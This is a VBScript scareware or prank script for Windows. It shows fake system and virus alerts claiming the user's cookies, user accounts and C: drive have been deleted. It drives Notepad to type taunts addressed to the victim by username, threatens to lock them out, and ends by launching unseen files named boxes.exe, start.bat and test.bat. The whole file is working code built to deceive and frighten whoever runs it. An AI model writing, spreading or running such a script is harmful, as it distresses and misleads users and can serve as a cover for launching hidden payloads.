Set WshShell = WScript.CreateObject("WScript.Shell")

strName = wshShell.ExpandEnvironmentStrings( "%USERNAME%" )

x=msgbox ("Warming: The file you have opened is not safe and has traces of malware and viruses attached, Click abort to close the program, Click retry to try to open the program again, Click ignore to ignore the problem and continue " ,2+16, "Windows Virus Detector")
WScript.sleep 1000
msgbox "Intrusion detected attempting to remove files!",48,ERROR
WScript.sleep 400
msgbox "Unable to remove files!",ERROR


WScript.sleep 2000
msgbox "Sytem failure in %WINDIR%",48,ERROR
WScript.sleep 1000
WshShell.Run "notepad"
WScript.sleep 400
WScript.sleep 200
wshShell.sendkeys "{ENTER}"
wshshell.sendkeys "A"
WScript.sleep 200
wshshell.sendkeys "r"
WScript.sleep 200
wshshell.sendkeys "e"
WScript.sleep 200
wshshell.sendkeys " "
WScript.sleep 200
wshshell.sendkeys "y"
WScript.sleep 200
wshshell.sendkeys "o"
WScript.sleep 200
wshshell.sendkeys "u"
WScript.sleep 200
wshshell.sendkeys " "
WScript.sleep 200
wshshell.sendkeys "s"
WScript.sleep 200
wshshell.sendkeys "c"
WScript.sleep 200
wshshell.sendkeys "a"
WScript.sleep 200
wshshell.sendkeys "r"
WScript.sleep 200
wshshell.sendkeys "e"
WScript.sleep 200
wshshell.sendkeys "d"
WScript.sleep 200
wshshell.sendkeys ","
WScript.sleep 200
wshshell.sendkeys " "
WScript.sleep 200
wshshell.sendkeys strName
WScript.sleep 200
wshshell.sendkeys "?"
x=msgbox ("?",4)
wshshell.sendkeys "{ENTER}"
wshshell.sendkeys "{ENTER}"
wshshell.sendkeys "Y"
WScript.sleep 200
wshshell.sendkeys "o"
WScript.sleep 200
wshshell.sendkeys "u"
WScript.sleep 200
wshshell.sendkeys " "
WScript.sleep 200
wshshell.sendkeys "S"
WScript.sleep 200
wshshell.sendkeys "h"
WScript.sleep 200
wshshell.sendkeys "o"
WScript.sleep 200
wshshell.sendkeys "u"
WScript.sleep 200
wshshell.sendkeys "l"
WScript.sleep 200
wshshell.sendkeys "d"
WScript.sleep 200
wshshell.sendkeys " "
WScript.sleep 200
wshshell.sendkeys "B"
WScript.sleep 200
wshshell.sendkeys "e..."
WScript.sleep 1000
wshshell.sendkeys "{ENTER}"
wshshell.sendkeys strName
WScript.sleep 100
wshshell.sendkeys "{ENTER}"
WScript.sleep 400
x=msgbox("Warning SEVERE Error, Unable to locate C:/Windows/Drivers/Windows32 Directory",0+48,"Windows") 
WScript.sleep 500
x=msgbox("Registry Error 402 Unable to locate file, Computer may be corrupted",0+48,"Windows") 
WScript.sleep 50
wshshell.sendkeys "im gonna delete ur crap!"
WScript.sleep 100
wshshell.sendkeys "{ENTER}"
WScript.sleep 1000
wshshell.sendkeys "starting process!!"
WScript.sleep 100
wshshell.sendkeys "{ENTER}"
WScript.sleep 2000
WScript.sleep 40
wshshell.sendkeys "{ENTER}"
WScript.sleep 40
wshshell.sendkeys "1"
x=msgbox("Error:your cookies have been deleted",0+48,"Windows Error:") 
WScript.sleep 40
wshshell.sendkeys "{ENTER}"
WScript.sleep 40
WScript.sleep 40
wshshell.sendkeys "{ENTER}"
WScript.sleep 2000
wshshell.sendkeys "2"
WScript.sleep 40
x=msgbox("Error: users have been deleted",0+48,"Windows Error:") 
wshshell.sendkeys "{ENTER}"
WScript.sleep 40
WScript.sleep 40
wshshell.sendkeys "{ENTER}"
WScript.sleep 2000

wshshell.sendkeys "3"
x=msgbox("Error:your C:drive has been deleted",0+48,"Windows Error:") 
WScript.sleep 200
wshshell.sendkeys "{ENTER}"

x=msgbox (" did you know that theres nothing that you can do and im gonna lock you out??" ,4+32, "C:\")

WScript.sleep 40
wshshell.sendkeys "finished"
wshshell.sendkeys "{ENTER}"
WScript.sleep 1000
WshShell.Run "boxes.exe"
WScript.sleep 2000
WshShell.Run "start.bat"
WshShell.Run "test.bat"